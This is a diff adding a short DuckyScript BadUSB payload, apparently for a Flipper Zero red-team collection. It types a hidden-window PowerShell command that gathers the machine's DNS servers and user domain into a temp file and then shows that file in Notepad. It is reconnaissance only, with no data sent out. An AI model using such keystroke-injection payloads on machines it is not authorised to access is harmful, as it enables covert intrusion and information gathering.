@@ -1,0 +1,7 @@
+REM CYBERFLIPPER - BASIC Level
+REM AD Domain Reconnaissance - Red Team OSINT
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -W Hidden -C "echo '=== DOMAIN RECON ===' > $env:TEMP\domain.txt; echo 'DNS SERVERS:' >> $env:TEMP\domain.txt; (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.DNSServerSearchOrder -ne $null}).DNSServerSearchOrder >> $env:TEMP\domain.txt; echo 'USER DOMAIN:' >> $env:TEMP\domain.txt; $env:USERDOMAIN >> $env:TEMP\domain.txt; notepad $env:TEMP\domain.txt"
+ENTER
